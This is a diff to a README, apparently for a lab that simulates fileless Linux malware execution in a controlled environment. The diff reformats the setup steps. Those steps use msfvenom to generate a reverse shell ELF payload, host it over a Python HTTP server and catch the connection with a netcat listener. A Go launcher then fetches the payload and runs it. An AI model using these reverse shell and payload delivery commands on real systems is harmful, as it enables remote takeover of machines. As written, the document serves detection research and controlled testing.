@@ -27,18 +27,15 @@ Follow these steps to replicate the fileless execution sequence in a controlled 
 ### Step 1: Generate the Test Payload
 Generate a standard Linux x64 reverse shell ELF binary:
 ```bash
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=<YOUR_LOCAL_IP> LPORT=4444 -f elf > shell.elf
-Step 2: Host the Payload
-Start a temporary HTTP server in the directory containing shell.elf to act as the remote delivery server:
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=<YOUR_LOCAL_IP> LPORT=4444 -f elf > raw_shell.elf
+#Step 2: Host the Payload
+#Start a temporary HTTP server in the directory containing shell.elf to act as the remote delivery server:
 python3 -m http.server 80
-Step 3: Set Up the Listener
-In a separate terminal, open a netcat listener to intercept the incoming reverse shell connection:
-
-Bash
+#Step 3: Set Up the Listener
+#In a separate terminal, open a netcat listener to intercept the incoming reverse shell connection:
 nc -nvlp 4444
-Step 4: Compile and Run the Go Simulation
-Ensure the target URL in main.go points to your Python server (http://localhost:80/shell.elf), then build and run the executable:
-
-Bash
+#Step 4: Compile and Run the Go Simulation
+#Ensure the target URL in main.go points to your Python server (http://localhost:80/shell.elf), then build and run the executable:
 go build -o fileless_launcher main.go
 ./fileless_launcher
+```
